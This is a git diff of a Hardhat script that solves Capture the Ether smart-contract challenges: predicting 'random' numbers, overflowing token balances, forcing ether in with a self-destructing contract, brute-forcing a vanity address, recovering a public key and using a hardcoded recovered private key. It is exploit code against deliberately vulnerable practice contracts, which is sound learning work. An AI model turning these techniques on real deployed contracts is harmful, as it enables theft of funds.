@@ -1,4 +1,8 @@
-import { ethers } from "hardhat";
+import { ethers as het } from "hardhat";
+import * as ethers from 'ethers'
+import { BN } from 'bn.js'
+
+const eut = ethers.utils
 
 let signer: any
 let one_eth = ethers.utils.parseEther('1.0')
@@ -21,12 +25,12 @@ async function step(desc: string, promise: Promise<any>) {
 
 // @param mapSlot ethers.BigNumber
 async function getMappingAtAddress(contract: string, mapSlot: any, at: String) {
-    return await ethers.provider.getStorageAt(contract, 
+    return await het.provider.getStorageAt(contract, 
                     ethers.utils.keccak256(abiCoder.encode(
-                     ['address', 'uint256'],      
+                     ['address', 'uint256'],
                      [at, ethers.BigNumber.from(mapSlot)]
-              ))                               
-    )                                             
+              ))
+    )
 }
 
 async function setNickname() {
@@ -39,13 +43,13 @@ async function setNickname() {
 	await contract.setNickname(right_pad(Buffer.from('quiark'), 32))
 }
 
-async function guessNumber() {             
-    let contract = new ethers.Contract(    
+async function guessNumber() {
+    let contract = new ethers.Contract(
         '0x2a359FA5f7cB00E100e972315426Df2DeB77906e',
-        [                                  
+        [
             'function guess(uint8 n) public payable'
-        ], signer                          
-    )                                      
+        ], signer
+    )
 	await contract.guess(42, { value: ethers.utils.parseEther('1.0') })
 	return contract
 }
@@ -70,12 +74,12 @@ async function guessSecretNumber() {
 	console.log(tx)
 	return contract
 }
-                                     
-async function guessRandomNumber() { 
-    let blockNumber = 12846309       
-    let timestamp = 1661233536       
+
+async function guessRandomNumber() {
+    let blockNumber = 12846309
+    let timestamp = 1661233536
     let prevBlockHash = '0x5fd2ec6c4ae9dce84b5b4178636c3b50fa882f3ba423015af80cb64f2e47258a'
-                                     
+
     let contract = new ethers.Contract(
 		'0xBd9399Fe56F9aC2Fdca5BE869a8b3C47d4010f30',
 		[
@@ -89,7 +93,7 @@ async function guessRandomNumber() {
 			await ethers.provider.getStorageAt(contract.address, ix))
 	}
 	*/
-	console.log('storage slot 0 ', await ethers.provider.getStorageAt(contract.address, 0))
+	console.log('storage slot 0 ', await het.provider.getStorageAt(contract.address, 0))
 	let tx = await contract.guess(
 		0xb5,
 		{ value: ethers.utils.parseEther('1.0') })
@@ -134,23 +138,23 @@ async function attackNewNumber() {
 		[
 			'function guess(uint8 n) public payable',
             'function isComplete() public view returns (bool)' 
-        ], signer                          
-    )                                      
-    let attackFactory = await ethers.getContractFactory('AttackNewNumber')
+        ], signer
+    )
+    let attackFactory = await het.getContractFactory('AttackNewNumber')
     let attack = await attackFactory.deploy(target.address)
     //let attack = attackFactory.attach('0xA25b90b7Ee6BaB71e25F80cd75CF7EAAF02Bc2E8')
     console.log('attecker deployed at ', attack.address)
     console.log('target bal before attack: ', 
-                await ethers.provider.getBalance(target.address))
+                await het.provider.getBalance(target.address))
 	for (var ix = 0; ix < 7; ix++) {
 		let tx = await attack.attempt(31, { gasLimit: 150_000, value: one_eth })
-        console.log(tx.hash)                        
-    }                                      
-    return target                          
-}                                          
-                                           
-async function predictFutureChallenge() {  
-    let target = new ethers.Contract(      
+        console.log(tx.hash)
+    }
+    return target
+}
+
+async function predictFutureChallenge() {
+    let target = new ethers.Contract(
 		'0xf557bcee726Ede3Dea255Ff20f73CCc20127C4E5',
 		[
 			'function guess(uint8 n) public payable',
@@ -158,7 +162,7 @@ async function predictFutureChallenge() {
         ], signer
     )
 
-	let attackFactory = await ethers.getContractFactory('AttackTheFuture')
+	let attackFactory = await het.getContractFactory('AttackTheFuture')
 	//let attack = await attackFactory.deploy(target.address, { value: one_eth })
     let attack = attackFactory.attach('0x42a70530757074ad9bDc3E68Eda2985f9e330B7f')
     console.log('attecker deployed at ', attack.address)
@@ -239,7 +243,7 @@ numTokens			23158417847463239084714197001737581570653996933128112807891516801582
  */
 
 	const abiCoder = new ethers.utils.AbiCoder();
-	console.log(await ethers.provider.getStorageAt(target.address, 
+	console.log(await het.provider.getStorageAt(target.address, 
 				 ethers.utils.keccak256(abiCoder.encode(
 					 ['address', 'uint256'],
 					 [signer.address, ethers.BigNumber.from(0)]))
@@ -251,9 +255,9 @@ numTokens			23158417847463239084714197001737581570653996933128112807891516801582
 						 '00'
 					 , 'hex'))))
 				 */
-	let before = await ethers.provider.getBalance(signer.address)
+	let before = await het.provider.getBalance(signer.address)
 	await step('selling something to get cash', target.sell(2))
-	let after = await ethers.provider.getBalance(signer.address)
+	let after = await het.provider.getBalance(signer.address)
 	console.log({gained : after.sub(before),
 			   before: before.toString(),
 			   after: after.toString()})
@@ -270,10 +274,10 @@ async function tokenWhaleChallenge() {
         ], signer
     )
 
-	let friend = (await ethers.getSigners())[1]
-	let passerby = (await ethers.getSigners())[2]
-	console.log('friend (pls fund): ', friend.address, ' balance ', await ethers.provider.getBalance(friend.address))
-	if ((await ethers.provider.getBalance(friend.address)).isZero()) {
+	let friend = (await het.getSigners())[1]
+	let passerby = (await het.getSigners())[2]
+	console.log('friend (pls fund): ', friend.address, ' balance ', await het.provider.getBalance(friend.address))
+	if ((await het.provider.getBalance(friend.address)).isZero()) {
 		await signer.sendTransaction({ to: friend.address, value: one_eth.mul(2) })
 	}
 
@@ -286,22 +290,22 @@ async function tokenWhaleChallenge() {
 			   .approve(
 				   friend.address,
                    ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')))
-    await step('transferFrom friend',   
-               target.connect(friend)   
-               .transferFrom(           
-                   signer.address,      
+    await step('transferFrom friend',
+               target.connect(friend)
+               .transferFrom(
+                   signer.address,
 				   passerby.address,
-                   1000,             
+                   1000,
 				   { gasLimit: 200_000 }))
    */
-	await step('whale friend now gives something to signer', 
+	await step('whale friend now gives something to signer',
 			   target.connect(friend)
 				.transfer(signer.address, 8_000_000_000))
 	console.log('friend balance', await getMappingAtAddress(target.address, 2, friend.address))
 	console.log('passerby balance:', await getMappingAtAddress(target.address, 2, passerby.address))
-    return target                                 
-}                                                 
-                                                  
+    return target
+}
+
 async function retirementFundChallenge() {
     let target = new ethers.Contract(
 		'0xDd0DB72C1fdC774D6Cd8142aeAfeDe8E9fae9B1E',
@@ -310,7 +314,7 @@ async function retirementFundChallenge() {
 			'function collectPenalty() public'
         ], signer
     )
-	let kamikazeFactory = await ethers.getContractFactory('Kamikaze')
+	let kamikazeFactory = await het.getContractFactory('Kamikaze')
 	let kamikaze = await kamikazeFactory.deploy({ value: one_eth.mul(3) })
 
 	await step('overfund', kamikaze.bye(target.address))
@@ -338,10 +342,10 @@ async function mappingChallenge() {
 	await target.set(complSlot, 1)
 	// 0 :: isComplete slot
 	// 1 :: map slot 
-	console.log(await ethers.provider.getStorageAt(target.address, 0))
-	console.log(await ethers.provider.getStorageAt(target.address, 1))
-	console.log(await ethers.provider.getStorageAt(target.address, firstSlot))
-	console.log(await ethers.provider.getStorageAt(target.address, firstSlot.add(1)))
+	console.log(await het.provider.getStorageAt(target.address, 0))
+	console.log(await het.provider.getStorageAt(target.address, 1))
+	console.log(await het.provider.getStorageAt(target.address, firstSlot))
+	console.log(await het.provider.getStorageAt(target.address, firstSlot.add(1)))
 	return target
 }
 
@@ -367,7 +371,7 @@ async function donationChallenge() {
 }
 
 async function measurements() {
-	let measureFactory = await ethers.getContractFactory('Measure')
+	let measureFactory = await het.getContractFactory('Measure')
 	let measure = await measureFactory.deploy()
 
 	//await measure.show();
@@ -379,8 +383,8 @@ async function measurements() {
 	console.log(await measure.getQueue(1))
 	console.log(await measure.getQueue(2))
 	console.log(await measure.getQueue(3))
-	console.log('length', await ethers.provider.getStorageAt(measure.address, 0))
-	console.log(await ethers.provider.getStorageAt(measure.address,
+	console.log('length', await het.provider.getStorageAt(measure.address, 0))
+	console.log(await het.provider.getStorageAt(measure.address,
 						   ethers.utils.keccak256(abiCoder.encode(
 							   ['uint256'], [0]))))
 }
@@ -415,20 +419,20 @@ async function fiftyYears() {
 	//	upsert()
 	
 	async function dumpStorage() {
-		console.log('[0] queue.length:', await ethers.provider.getStorageAt(target.address, 0))
-		console.log('[1] head        :', await ethers.provider.getStorageAt(target.address, 1))
+		console.log('[0] queue.length:', await het.provider.getStorageAt(target.address, 0))
+		console.log('[1] head        :', await het.provider.getStorageAt(target.address, 1))
 		let start = ethers.BigNumber.from(ethers.utils.keccak256(abiCoder.encode(
 			['uint256'], [0])))
 		for (let ix = 0; ix < 4; ix++) {
-			console.log('queue[',ix,'].amount:', await ethers.provider.getStorageAt(target.address, start.add(ix * 2 + 0)))
-			console.log('queue[',ix,'].timest:', await ethers.provider.getStorageAt(target.address, start.add(ix * 2 + 1)))
+			console.log('queue[',ix,'].amount:', await het.provider.getStorageAt(target.address, start.add(ix * 2 + 0)))
+			console.log('queue[',ix,'].timest:', await het.provider.getStorageAt(target.address, start.add(ix * 2 + 1)))
 		}
 	}
 	
 	// process A
 	if (true) {
 		let one_days = 24 * 60 * 60
-		console.log('starting balance:', await ethers.provider.getBalance(target.address))
+		console.log('starting balance:', await het.provider.getBalance(target.address))
 		await step('step 1', target.upsert(
 					100, 
 					801002003004,
@@ -453,7 +457,7 @@ async function fiftyYears() {
 			// queue[1] = { 3, 0 }
 		await dumpStorage()
 		await step('step 30', target.withdraw(3, { gasLimit: 500_000 }))
-		console.log('final balance:', await ethers.provider.getBalance(target.address))
+		console.log('final balance:', await het.provider.getBalance(target.address))
 	}
 
 	// alternative process B
@@ -463,14 +467,169 @@ async function fiftyYears() {
 			// queue.length == 100
 	}
 	return target
-}                                      
-                                       
-                                                  
-async function main() {                           
-    signer = (await ethers.getSigners())[0];      
-    console.log('signer', signer.address)         
-                                       
-	let contract = await fiftyYears()
+}
+
+class MadeUpSigningKeySearch extends ethers.utils.SigningKey {
+	signDigest(digest: ethers.utils.BytesLike) {
+		let batch = process.env.BATCH
+		let ok = 0
+		let fail = 0
+		console.log(batch)
+		for (let ix = 0; ix < 0xff00ff00ff; ix++) {
+			let signature = {
+				recoveryParam: 0,
+				r: ethers.utils.hexZeroPad("0x" + ix.toString(), 32),
+				s: ethers.utils.hexZeroPad("0x" + batch + "00deadbeefcafebabe", 32),
+			}
+
+			try {
+				let addr = ethers.utils.recoverAddress(digest, signature)
+				if (addr.toLowerCase().includes('badc0de')) {
+					console.log(ix, addr, batch)
+					console.log(signature)
+					return ethers.utils.splitSignature(signature)
+				}
+				ok++
+			} catch (e) { fail++ }
+			if (ix % 50_000 == 0) console.log('.', ix)
+		}
+		throw new Error('not found')
+	}
+
+}
+
+class MadeUpSigningKey extends ethers.utils.SigningKey {
+	signDigest(digest: ethers.utils.BytesLike) {
+		return ethers.utils.splitSignature(
+		{
+			recoveryParam: 0,
+			r: '0x0000000000000000000000000000000000000000000000000000000001961041',
+			s: '0x000000000000000000000000000000000000000000022200deadbeefcafebabe'
+		})
+	}
+
+}
+
+async function fuzzyIdentity() {
+	let target = new ethers.Contract(
+		'0x40BE4B3970A454E676fd7AEa57AA4B3c4c8DA6aF',
+		[
+			'function isComplete() public view returns (bool)',
+		], signer
+	)
+
+
+	/*
+	 * Ooops, implemented the wrong kind of bruteforcing
+	 *
+	let walletFactory = await het.getContractFactory('PersonalWallet')
+	let deploytx = walletFactory.getDeployTransaction()
+	let signingkey = new MadeUpSigningKey('0xabababababababababababababababababababababababababababababababab')
+	let wallet = new ethers.Wallet(signingkey)
+	await het.provider.sendTransaction(await wallet.signTransaction(deploytx))
+	*/
+
+	if (false) { // done
+		let ix =  1
+		while (ix != 0) {
+			let wallet = new ethers.Wallet(ethers.utils.hexZeroPad('0x' + ix, 32))
+			let addr = ethers.utils.getContractAddress({ from: wallet.address, nonce: 0 })
+
+			if (addr.toLowerCase().includes('badc0de')) {
+				console.log(addr, ix, wallet.privateKey)
+				break                           
+			}                                   
+
+			if (ix % 10_000 == 0) console.log('. ', ix)
+				ix ++                               
+
+		}
+	} else {
+		let ix = 4552012
+		let wallet = new ethers.Wallet(ethers.utils.hexZeroPad('0x' + ix, 32), het.provider)
+		let walletFactory = await het.getContractFactory('PersonalWallet', {
+			signer: wallet, provider: het.provider
+		})
+
+		//await step('prefund', signer.sendTransaction({ to: wallet.address, value: one_eth.mul(5).div(10), gasLimit: 100_000 }))
+		//await step('deploy', het.provider.sendTransaction(await wallet.signTransaction(deploytx)))
+		//await step('deploy', walletFactory.deploy())
+		await step('auth', walletFactory.attach('0x74C142B55814A770BAdC0DE9995A5f42aaA22E51').auth(target.address, { gasLimit: 500_000 }))
+	}
+
+	return target
+}
+
+async function publicKeyChallenge() {
+	let tx = '0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb'
+
+	let target = new ethers.Contract(
+		'0x2BaAEE4cE5f6ABFA336fBF93f3Dc67099A17903b',
+		[
+			'function isComplete() public view returns (bool)',
+			'function authenticate(bytes publicKey) public'
+		], signer
+	)
+
+	let txobj = await het.provider.getTransaction(tx) as any
+	let from = txobj.from
+
+	function getTxDigest(tx: any) {
+		let txobj = Object.assign({}, tx)
+		let sig = {
+			r: txobj.r as string,
+			s: txobj.s,
+			v: txobj.v
+		}
+		delete txobj.s
+		delete txobj.r
+		delete txobj.v
+		delete txobj.from
+		delete txobj.wait
+		delete txobj.creates
+		delete txobj.hash
+		delete txobj.accessList
+		delete txobj.blockHash
+		delete txobj.blockNumber
+		delete txobj.transactionIndex
+		delete txobj.confirmations
+
+		let digest = ethers.utils.keccak256(ethers.utils.serializeTransaction(txobj))
+		return digest
+	}
+
+	let digest = getTxDigest(txobj)
+
+	let pubkey = ethers.utils.recoverPublicKey(digest, txobj)
+	let addr = eut.recoverAddress(digest, txobj)
+	console.log({
+		pubkey,
+		digest,
+		tx,
+		hash_pubkey: eut.keccak256(pubkey),
+		sol_hash_pubkey: eut.solidityKeccak256(['bytes'], [pubkey]),
+		addr
+	})
+	step('auth', target.authenticate(eut.hexDataSlice(pubkey, 1), { gasLimit: 400_000 }))
+	return target
+}
+
+async function accountTakeover() {
+	let wallet = new ethers.Wallet('0x614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269', het.provider)
+	let target = new ethers.Contract(
+		'0xCe8Ec74Ef059F44970fD3eB113e6aDc4cC14CD80',
+		[
+			'function isComplete() public view returns (bool)',
+			'function authenticate() public'
+		], wallet
+	)
+	await target.authenticate()
+}
+
+async function main() {
+	signer = (await het.getSigners())[0];
+
+	let contract = await accountTakeover()
 
 	/*
 	let challenge = new ethers.Contract(
